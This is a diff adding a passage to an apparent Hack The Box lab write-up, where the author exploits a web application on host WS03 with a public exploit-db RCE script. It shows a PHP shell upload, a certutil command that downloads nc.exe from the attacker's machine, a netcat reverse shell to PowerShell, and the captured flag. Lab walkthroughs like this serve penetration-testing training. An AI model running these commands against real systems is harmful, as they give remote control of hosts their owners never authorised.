@@ -142,3 +142,60 @@ Let me google if it has any vulnerability.
 Luckily, I was able to find RCE exploit from exploit-db :
 https://www.exploit-db.com/exploits/49557
 
+Since it's definitely low-hanging fruit, let's try this exploit first.
+
+```bash
+┌──(kali㉿kali)-[~/htb/WS03]
+└─$ python 49557.py -u http://172.16.1.102 -c 'whoami'
+[+] Registered with mobile phone 160519235 and password 'dante123'
+[+] PHP shell uploaded
+[+] Command output
+dante-ws03\blake
+```
+
+What an easy exploit! I can easily run a code on the target system!
+Let's spawn reverse shell after uploading `nc.exe`.
+
+```bash
+┌──(kali㉿kali)-[~/htb/WS03]
+└─$ python 49557.py -u http://172.16.1.102 -c 'certutil.exe -urlcache -split -f http://10.10.14.3:8888/nc.exe'
+[+] Registered with mobile phone 776967310 and password 'dante123'
+[+] PHP shell uploaded
+[+] Command output
+****  Online  ****
+  0000  ...
+  e800
+CertUtil: -URLCache command completed successfully.
+
+
+
+┌──(kali㉿kali)-[~/htb/WS03]
+└─$ python 49557.py -u http://172.16.1.102 -c 'nc.exe 10.10.14.3 9000 -e powershell.exe'
+[+] Registered with mobile phone 963010259 and password 'dante123'
+[+] PHP shell uploaded
+```
+
+Then let's capture the shell with listener.
+
+```bash
+┌──(kali㉿kali)-[~/htb/WS03]
+└─$ nc -nlvp 9000
+listening on [any] 9000 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.110.3] 4648
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+
+PS C:\Apache24\htdocs\user\images> whoami
+whoami
+dante-ws03\blake
+
+
+PS C:\Users\blake\Desktop> cat flag.txt
+cat flag.txt
+DANTE{U_M4y_Kiss_Th3_Br1d3}
+```
+
+
